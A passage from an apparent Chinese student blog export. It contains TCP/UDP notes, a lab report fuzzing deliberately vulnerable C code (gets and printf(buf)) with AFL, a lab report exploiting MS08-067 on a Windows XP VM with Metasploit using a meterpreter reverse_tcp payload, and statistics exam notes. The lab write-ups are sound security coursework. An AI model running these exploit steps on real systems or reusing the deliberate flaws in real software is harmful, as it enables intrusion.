<p><strong>是否是可靠传输</strong>：远地主机在收到 UDP 报文后，不需要给出任何确认，并且不保证数据不丢失，不保证是否顺序到达。TCP 提供可靠的传输服务，TCP 在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制。通过 TCP 连接传输的数据，无差错、不丢失、不重复、并且按序到达。</p>
<p><strong>是否有状态</strong>：这个和上面的“是否可靠传输”相对应。TCP 传输是有状态的，这个有状态说的是 TCP 会去记录自己发送消息的状态比如消息是否发送了、是否被接收了等等。为此 ，TCP 需要维持复杂的连接状态表。而 UDP 是无状态服务，简单来说就是不管发出去之后的事情了。</p>
<p><strong>传输效率</strong>：由于使用 TCP 进行传输的时候多了连接、确认、重传等机制，所以 TCP 的传输效率要比 UDP 低很多。</p>
<p><strong>传输形式</strong>：TCP 是面向字节流的，UDP 是面向报文的。</p>
<p><strong>首部开销</strong>：TCP 首部开销（20 ～ 60 字节）比 UDP 首部开销（8 字节）要大。</p>
<p><strong>是否提供广播或多播服务</strong>：TCP 只支持点对点通信，UDP 支持一对一、一对多、多对一、多对多；</p>
<h3 id="TCP三次握手与四次挥手"><a href="#TCP三次握手与四次挥手" class="headerlink" title="TCP三次握手与四次挥手"></a>TCP三次握手与四次挥手</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306224053063.png" alt="image-20250306224053063" style="zoom:50%;" />

<p><strong>一次握手</strong>:客户端发送带有 SYN（SEQ&#x3D;x） 标志的数据包 -&gt; 服务端，然后客户端进入 <strong>SYN_SEND</strong> 状态，等待服务端的确认；</p>
<p><strong>二次握手</strong>:服务端发送带有 SYN+ACK(SEQ&#x3D;y,ACK&#x3D;x+1) 标志的数据包 –&gt; 客户端,然后服务端进入 <strong>SYN_RECV</strong> 状态；</p>
<p><strong>三次握手</strong>:客户端发送带有 ACK(ACK&#x3D;y+1) 标志的数据包 –&gt; 服务端，然后客户端和服务端都进入<strong>ESTABLISHED</strong> 状态，完成 TCP 三次握手。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306224123498.png" alt="image-20250306224123498" style="zoom:50%;" />

<p><strong>第一次挥手</strong>：客户端发送一个 FIN（SEQ&#x3D;x） 标志的数据包-&gt;服务端，用来关闭客户端到服务端的数据传送。然后客户端进入 <strong>FIN-WAIT-1</strong> 状态。</p>
<p><strong>第二次挥手</strong>：服务端收到这个 FIN（SEQ&#x3D;X） 标志的数据包，它发送一个 ACK （ACK&#x3D;x+1）标志的数据包-&gt;客户端 。然后服务端进入 <strong>CLOSE-WAIT</strong> 状态，客户端进入 <strong>FIN-WAIT-2</strong> 状态。</p>
<p><strong>第三次挥手</strong>：服务端发送一个 FIN (SEQ&#x3D;y)标志的数据包-&gt;客户端，请求关闭连接，然后服务端进入 <strong>LAST-ACK</strong> 状态。</p>
<p><strong>第四次挥手</strong>：客户端发送 ACK (ACK&#x3D;y+1)标志的数据包-&gt;服务端，然后客户端进入<strong>TIME-WAIT</strong>状态，服务端在收到 ACK (ACK&#x3D;y+1)标志的数据包后进入 CLOSE 状态。此时如果客户端等待 <strong>2MSL</strong> 后依然没有收到回复，就证明服务端已正常关闭，随后客户端也可以关闭连接了。</p>
<p>服务端收到客户端断开连接的请求时，可能还有一些数据没有发完，这时先回复 ACK，表示接收到了断开连接的请求。等到数据发完之后再发 FIN，断开服务端到客户端的数据传送。</p>
<h3 id="TCP如何保证传输可靠性"><a href="#TCP如何保证传输可靠性" class="headerlink" title="TCP如何保证传输可靠性"></a>TCP如何保证传输可靠性</h3><ol>
<li><strong>基于数据块传输</strong>：应用数据被分割成 TCP 认为最适合发送的数据块，再传输给网络层，数据块被称为报文段或段。</li>
<li><strong>对失序数据包重新排序以及去重</strong>：TCP 为了保证不发生丢包，就给每个包一个序列号，有了序列号能够将接收到的数据根据序列号排序，并且去掉重复序列号的数据就可以实现数据包去重。</li>
<li><strong>校验和</strong> : TCP 将保持它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。</li>
<li><strong>重传机制</strong> : 在数据包丢失或延迟的情况下，重新发送数据包，直到收到对方的确认应答（ACK）。TCP 重传机制主要有：基于计时器的重传（也就是超时重传）、快速重传（基于接收端的反馈信息来引发重传）、SACK（在快速重传的基础上，返回最近收到的报文段的序列号范围，这样客户端就知道，哪些数据包已经到达服务器了）、D-SACK（重复 SACK，在 SACK 的基础上，额外携带信息，告知发送方有哪些数据包自己重复接收了）。</li>
<li><strong>流量控制</strong> : TCP 连接的每一方都有固定大小的缓冲空间，TCP 的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议（TCP 利用滑动窗口实现流量控制）。</li>
<li><strong>拥塞控制</strong> : 当网络拥塞时，减少数据的发送。TCP 在发送数据的时候，需要考虑两个因素：一是接收方的接收能力，二是网络的拥塞程度。接收方的接收能力由滑动窗口表示，表示接收方还有多少缓冲区可以用来接收数据。网络的拥塞程度由拥塞窗口表示，它是发送方根据网络状况自己维护的一个值，表示发送方认为可以在网络中传输的数据量。发送方发送数据的大小是滑动窗口和拥塞窗口的最小值，这样可以保证发送方既不会超过接收方的接收能力，也不会造成网络的过度拥塞。</li>
</ol>
<h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2>]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验二——实验报告</title>
    <url>/2024/12/14/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%E2%80%94%E2%80%94%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h4 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h4><p>使用American Fuzzy Lop(<a href="http://lcamtuf.coredump.cx/al/)%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98C/C++%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E3%80%82%E5%AE%8C%E6%88%90%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E3%80%82">http://lcamtuf.coredump.cx/al/)工具挖掘C/C++程序漏洞。完成实验报告。</a></p>
<h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><ol>
<li><p>下载并安装AFL。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget wget https://lcamtuf.coredump.cx/afl/releases/afl-2.52b.tgz</span><br><span class="line">tar -xvzf afl-2.52b.tgz</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206154633015.png" alt="image-20241206154633015"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206155122771.png" alt="image-20241206155122771"></p>
</li>
<li><p>准备一段c代码，该代码包含用户输入的处理逻辑，可能引发崩溃或未定义行为。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用使用AFL的<code>afl-gcc</code>编译器编译程序。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo afl-gcc -o main.o main.c</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206162016594.png" alt="image-20241206162016594"></p>
</li>
<li><p>准备一个简单的输入样本，然后启动AFL模糊测试，启动失败，按照提示操作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir inputs</span><br><span class="line">echo &quot;abc&quot; &gt;/inputs/sample.txt</span><br><span class="line">afl-fuzz -i inputs/ -o outputs ./main.o</span><br><span class="line">sudo su</span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206162459097.png" alt="image-20241206162459097"></p>
<p>成功启动运行。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206162628894.png" alt="image-20241206162751407"></p>
</li>
</ol>
<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><p>根据结果显示，afl一共运行了1min24s，总周期数433，总路径数为3，发现了6个crash。</p>
<p>outputs&#x2F;crash下显示了这6个crash：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206165614352.png" alt="image-20241206165614352"></p>
<p><code>sig:06</code> 表示程序崩溃时接收到的是 <code>SIGABRT</code> 信号，这通常是由于程序调用了 <code>abort()</code> 函数或出现了某种致命错误。</p>
<p><code>sig:11</code> 表示程序崩溃时接收到的是 <code>SIGSEGV</code> 信号，即段错误（Segmentation Fault），通常发生在访问非法内存时。</p>
<p>使用xxd工具分析这些crash。</p>
<p>对id:000000，表示下面这个测试数据引发了该crash：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206165903620.png" alt="image-20241206165903620"></p>
<p>该输入长度为107，超出了buf[100]的长度引发了栈溢出错误。</p>
<p>对于id:000001：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206170556708.png" alt="image-20241206170556708"></p>
<p>由于第一个字符为F，且长度为6，引发了错误。</p>
<p>对于id:000002：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206170727041.png" alt="image-20241206170727041"></p>
<p>超出了buf[100]的长度引发了错误。</p>
<p>对于id:000003:</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206170759728.png" alt="image-20241206170759728"></p>
<p>包含%n这个printf控制符，引发了错误。</p>
<p>对于id:000004：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206170922018.png" alt="image-20241206170922018"></p>
<p>超出了buf[100]的长度引发了错误。</p>
<p>对于id:000005：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241206170844957.png" alt="image-20241206170844957"></p>
<p>由于第一个字符为A，且长度恰为66，引发了错误。</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验三——实验报告</title>
    <url>/2024/12/18/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%E2%80%94%E2%80%94%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h4 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h4><p>使用渗透性测试工具 Metasploit 进行漏洞测试。实验内容如下。<br>1)安装并配置Kali(<a href="https://www.kali.org)./">https://www.kali.org)。</a><br>2)从Kali 操作系统的终端初始化和启动Metasploit 工具。<br>3)使用 Metasploit 挖掘 MS08-067 等漏洞。</p>
<span id="more"></span>

<h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><h5 id="一-安装并配置Kali"><a href="#一-安装并配置Kali" class="headerlink" title="一 安装并配置Kali"></a>一 安装并配置Kali</h5><ol>
<li><p>在<a href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a>中下载kali-linux-2024.3-vmware-amd64.7z并解压。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/4677d3c8b57a97876e5a46a5658eb514.png" alt="4677d3c8b57a97876e5a46a5658eb514"></p>
</li>
<li><p>在VMware WorkStation中，点击“打开虚拟机”，选择刚刚下载的镜像。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/9ae5bd532a4d8d5f6e02cda74156dc29.png" alt="9ae5bd532a4d8d5f6e02cda74156dc29"></p>
</li>
<li><p>启动虚拟机，输入账户密码（默认均为kali），进入桌面。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210160430438.png" alt="image-20241210160430438"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210160508753.png" alt="image-20241210160508753"></p>
</li>
</ol>
<h5 id="二-初始化和启动Metasploit-工具"><a href="#二-初始化和启动Metasploit-工具" class="headerlink" title="二 初始化和启动Metasploit 工具"></a>二 初始化和启动Metasploit 工具</h5><ol>
<li><p>通过以下命令设置和初始化 Metasploit 的数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service --status-all</span><br><span class="line">service postgresql start</span><br><span class="line">service postgresql status</span><br><span class="line">msfdb init</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210161524862.png" alt="image-20241210161524862"><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210161617700.png" alt="image-20241210161617700"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210161717136.png" alt="image-20241210161717136"></p>
</li>
<li><p>然后启动 Metasploit 工具并检查db状态。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; db_status</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210161948109.png" alt="image-20241210161948109"></p>
</li>
</ol>
<h5 id="三-挖掘-MS08-067-等漏洞"><a href="#三-挖掘-MS08-067-等漏洞" class="headerlink" title="三 挖掘 MS08-067 等漏洞"></a>三 挖掘 MS08-067 等漏洞</h5><ol>
<li><p>准备靶机。</p>
<p>在VMware WorkStation中创建一个虚拟机，使用windows xp home edition镜像，按提示完成安装。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210165636348.png" alt="image-20241210165636348"></p>
<p>然后关闭系统防火墙。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210165825797.png" alt="image-20241210165825797"></p>
<p>打开命令行，输入<code>ipconfig</code>查看ip为：192.168.65.129。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241210170052464.png" alt="image-20241210170052464"></p>
<p>查看kali机的ip为192.168.65.130，并测试能否ping通windows机：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218160403878.png" alt="image-20241218160403878"></p>
<ol start="2">
<li><p>渗透攻击。</p>
<p>先输入<code>msfconsole</code>进入msf6终端：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218155640851.png" alt="image-20241218155640851"></p>
<p>然后输入<code>search ms08_067</code>查看该漏洞：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218155756403.png" alt="image-20241218155756403"></p>
<p>下面是要攻击的target：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218161045220.png" alt="image-20241218161045220"></p>
<p>输入<code>use exploit/windows/smb/ms08_067_netapi</code>加载该模块，然后输入<code>show payloads</code>查看可用的攻击载荷。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218155852123.png" alt="image-20241218155852123"></p>
<p>下面这个是需要的payload：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218160859967.png" alt="image-20241218160859967"></p>
<p>然后：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> LHOST <span class="comment">192.168.65.130 # Kali</span>虚拟机<span class="comment">ip</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RHOST 192.168.65.129 # windows xp</span>靶机<span class="comment">ip</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">target 34</span></span><br><span class="line">show <span class="comment">options</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218161227701.png" alt="image-20241218161227701"></p>
<p>输入<code>exploit</code>进行攻击：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218161332072.png" alt="image-20241218161332072"></p>
<p>在输入<code>shell</code>进入靶机命令行：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218161439683.png" alt="image-20241218161439683"></p>
<p>测试确实是windows靶机的ip：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241218161515287.png" alt="image-20241218161515287"></p>
<p>成功！</p>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>kali</tag>
        <tag>windows xp</tag>
        <tag>vmware</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>统计模型：理论与实践2024 期末复习</title>
    <url>/2025/01/07/%E7%BB%9F%E8%AE%A1%E6%A8%A1%E5%9E%8B-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><ol>
<li><p>聚类的定义，方法，k-means算法步骤，方法论的分类。k-means步骤，优缺点。比如迭代3次之后的结果。评价聚类算法的好坏，角度有哪些。</p>
</li>
<li><p>em算法：概念，适用场景（可以扩展，混合高斯等），em的实现，计算，jensen不等式，如何计算。计算：高斯分布混合而成。em优缺点，其他应用。</p>
</li>
<li><p>分类：决策树，knn，贝叶斯，基本的分类的算法。分类的定义，现实世界的应用场景（垃圾邮件识别等）。训练和验证测试集的划分，要完成哪些条件。常见的分类器。贝叶斯公式的形式，计算。决策树，id3，c4.5克服了缺点（简答题）</p>
</li>
<li><p>gamma：知道gamma函数的形式，在实数域的特征，阶乘。要看一下性质（递推式），如何证明性质。gamma函数积分的形式，阶乘实现。</p>
</li>
<li><p>beta分布：最基本的表现（4个分布），看到特征、数学表达式，符号的含义是什么（简答题）。会计算题。beta分布在前四种之上构造的，看到特征characteristics，稍微了解一下表达，也有计算题。每个分布数学公式，均值方差，图形表达，应用，例题等等。</p>
</li>
<li><p>nlp：不用管工具使用。传统nlp的任务是什么。做分词，特征构建等。可用特征（词频，共线频率等）。稍微看一下分词。什么事停用词。命名实体识别。其他处理过程（词根化等）。马尔科夫链，看一下转移矩阵的概率，计算。n-gram应用。word vector如何构建，给你一个句子，写出来对应的向量。tf-idf不用太多记，如何根据它构建主题模型。词项-文档矩阵，给一个文档，算出来tf-idf，得到矩阵。了解信息熵概念，什么是最大熵。·</p>
</li>
</ol>
<span id="more"></span>

<h1 id="2024期末回忆"><a href="#2024期末回忆" class="headerlink" title="2024期末回忆"></a>2024期末回忆</h1><h2 id="简答题（每题5分，共8题）"><a href="#简答题（每题5分，共8题）" class="headerlink" title="简答题（每题5分，共8题）"></a>简答题（每题5分，共8题）</h2><ol>
<li>简述聚类的定义，给出两个经典聚类算法。</li>
<li>简述EM算法的原理。</li>
<li>分类中数据集、验证集、测试集的作用和区别。</li>
<li>C4.5相比ID3的改进。</li>
<li>给出泊松分布的概率密度函数，描述参数k和$\lambda$的含义。</li>
<li>给出正态分布的概率密度函数，以及均值和方差。</li>
<li>给出典型的NLP任务，以及特征应用。</li>
<li>什么是词项-文档矩阵，如何构造？</li>
</ol>
<h2 id="计算题（每题12分，共5题）"><a href="#计算题（每题12分，共5题）" class="headerlink" title="计算题（每题12分，共5题）"></a>计算题（每题12分，共5题）</h2><ol>
<li>Kmeans算法，给定一些坐标和两个初始中心点，计算第一次迭代。</li>
<li>给出正态分布的似然函数、最大似然函数，以及求偏导后的极大似然值。</li>
<li>给定先验概率和条件概率，计算朴素贝叶斯算法（要用全概率公式算分母）。</li>
<li>Bigram计算句子概率。</li>
<li>词袋模型。</li>
</ol>
<h2 id="评价"><a href="#评价" class="headerlink" title="评价"></a>评价</h2><p>htk老师虽然课件里的东西很难，但是考试出的题都非常基础，特别是计算题，又简单又好算。</p>
<h1 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h1><h2 id="【聚类】的定义"><a href="#【聚类】的定义" class="headerlink" title="【聚类】的定义"></a>【聚类】的定义</h2><p>给定一组点，并考虑点之间的距离，将这些点分组为一定数量的簇（集群 cluster），使得簇内的成员彼此接近&#x2F;相似，不同簇的成员不同。</p>
<p>通常，点位于高维空间中，相似性是使用距离度量定义的（如欧几里得距离、余弦相似度）</p>
<h2 id="【聚类】的方法"><a href="#【聚类】的方法" class="headerlink" title="【聚类】的方法"></a>【聚类】的方法</h2><ul>
<li>全局最优：穷举所有分区</li>
<li>启发式方法：k-means和k-medoids算法<ul>
<li>k-means：每个簇由簇的中心表示</li>
<li>k-medoid或PAM：每个簇由簇中的一个对象表示</li>
</ul>
</li>
</ul>
<h2 id="【聚类】方法论的分类"><a href="#【聚类】方法论的分类" class="headerlink" title="【聚类】方法论的分类"></a>【聚类】方法论的分类</h2><ul>
<li><p><strong>层次方法（Hierarchical Methods）</strong></p>
<ul>
<li>凝聚算法（Agglomerative Algorithms）</li>
<li>分割算法（Divisive Algorithms）</li>
</ul>
</li>
<li><p><strong>分区方法（Partitioning Methods）</strong></p>
<ul>
<li><p>重新定位算法（Relocation Algorithms）</p>
</li>
<li><p>概率聚类（Probabilistic Clustering）</p>
</li>
<li><p>K-medoids方法，或 PAM (Partition around medoids) </p>
</li>
<li><p>K-means方法</p>
</li>
<li><p>基于密度的算法（Density-Based Algorithms）</p>
<ul>
<li><p>基于密度的连接聚类（Density-Based Connectivity Clustering）</p>
</li>
<li><p>密度函数聚类（Density Functions Clustering）</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>基于网格的方法（Grid-Based Methods）</strong></p>
</li>
<li><p><strong>基于分类数据共现的方法（Methods Based on Co-Occurrence of Categorical Data）</strong></p>
</li>
<li><p><strong>基于约束的聚类（Constraint-Based Clustering）</strong></p>
</li>
<li><p><strong>机器学习中使用的聚类算法（Clustering Algorithms Used in Machine Learning）</strong></p>
<ul>
<li>梯度下降和人工神经网络（Gradient Descent and Artificial Neural Networks）</li>
<li>进化方法（Evolutionary Methods）</li>
</ul>
</li>
<li><p><strong>可扩展聚类算法（Scalable Clustering Algorithms）</strong></p>
</li>
<li><p><strong>高维数据算法（Algorithms For High Dimensional Data）</strong></p>
<ul>
<li>子空间聚类（Subspace Clustering）</li>
<li>投影技术（Projection Techniques）</li>
<li>联合聚类技术（Co-Clustering Techniques）</li>
</ul>
</li>
</ul>
<h2 id="K-means方法"><a href="#K-means方法" class="headerlink" title="K-means方法"></a>K-means方法</h2><h3 id="K-means步骤"><a href="#K-means步骤" class="headerlink" title="K-means步骤"></a>K-means步骤</h3><ol>
<li>初始化簇：为每个簇选择一个点。具体方法：首先随机选一个点，然后对接下来的k-1个点，与之前选的所有点的距离尽可能远。</li>
<li>将每个点划分到中心点离它最近的簇；</li>
<li>更新每个簇的中心点；</li>
<li>重复2-3步，直到簇不再变化、中心点稳定。</li>
</ol>
<h3 id="K-means优缺点"><a href="#K-means优缺点" class="headerlink" title="K-means优缺点"></a>K-means优缺点</h3><p><strong>优点：</strong></p>
<ul>
<li>相对有效：复杂度O(tkn)，其中n是对象数，k是簇数目，t是迭代次数。通常，k,t&lt;&lt;n；</li>
<li>通常在局部最优值处终止。可以使用模拟退火和遗传算法等技术找到全局最优解；</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>仅在均值能被定义时适用（不适用于只能被分类的、没有数学含义的数据）；</li>
<li>需要提前指定集群数量k；</li>
<li>噪声数据和异常值问题；</li>
<li>不适合发现具有非凸形状的簇；</li>
</ul>
<h2 id="评价聚类算法好坏的角度"><a href="#评价聚类算法好坏的角度" class="headerlink" title="评价聚类算法好坏的角度"></a>评价聚类算法好坏的角度</h2><p><strong>内部标准</strong>：良好的聚类方法将产生高质量的聚类，其中：</p>
<ul>
<li>类内相似性高；</li>
<li>类间相似性低；</li>
<li>聚类的质量取决于文档表示和使用的相似性度量；</li>
</ul>
<p><strong>外部标准</strong>：</p>
<ul>
<li><p>通过其发现高标准数据中部分或全部隐藏模式或潜在类别的能力来衡量聚类质量；</p>
</li>
<li><p>和 <strong>真实数据（ground truth）</strong> 对比（需要 labeled data）；</p>
</li>
<li><p>用 <strong>纯度（purity）</strong> 来简单度量：</p>
<ul>
<li><p>纯度直观理解为每个聚类中<strong>主导类别占比</strong>的大小；</p>
</li>
<li><p>然而纯度具有偏向性，因为当聚类结果中每个数据点都被分配到一个单独的簇时（也就是有 n个簇，等于数据点的总数），纯度会达到最大值。然而，这样的聚类并没有实际意义；</p>
</li>
<li><p>计算公式与示例：</p>
</li>
</ul>
</li>
</ul>
<p>$$<br>\text{Purity}(\omega_i) &#x3D; \frac{1}{n_i} \max_{j \in C}(n_{ij})<br>$$</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250105150637409.png" alt="image-20250105150637409" style="zoom: 50%;" />

<ul>
<li><p>用 <strong>RI（Random Index）</strong> 衡量：</p>
<ul>
<li><p>Rand Index 表示所有分类正确的数据点对所占的比例；</p>
</li>
<li><p>以下图为例，RI &#x3D; (20+72) &#x2F; (20 + 24 + 20 +72) &#x3D; 0.68；</p>
</li>
</ul>
<p>$$<br>RI &#x3D; \frac{A + D}{A + B + C + D}<br>$$</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250105152737857.png" alt="image-20250105152737857" style="zoom:50%;" /></li>
</ul>
<h1 id="EM算法"><a href="#EM算法" class="headerlink" title="EM算法"></a>EM算法</h1><h2 id="极大似然估计-MLE"><a href="#极大似然估计-MLE" class="headerlink" title="极大似然估计 MLE"></a>极大似然估计 MLE</h2><h3 id="似然函数"><a href="#似然函数" class="headerlink" title="似然函数"></a>似然函数</h3><p>似然函数表示在给定参数下，观察到当前数据的概率是多少。</p>
<p><strong>例：</strong></p>
<p>假设有十个人的身高为 $x_1, x_2, …., x_{10}$，符合正态分布$X \sim N(\mu, \sigma^2)$，其中$\mu和 \sigma^2$是男生身高的均值和方差。</p>
